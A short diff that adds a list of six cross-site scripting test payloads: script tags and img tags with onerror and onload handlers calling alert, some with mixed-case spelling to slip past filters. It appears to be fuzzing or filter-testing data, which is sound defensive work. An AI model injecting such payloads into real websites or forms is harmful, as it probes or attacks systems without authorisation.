@@ -1,0 +1,6 @@
+<script>alert(11)<script>
+<ScRipT>alert(12)<ScRipT>
+
+<img src=x onerror=alert(21)>
+<img src=x onload=alert(22)>
+<ImG sRc=x oNlOad=aLeRt(23)>
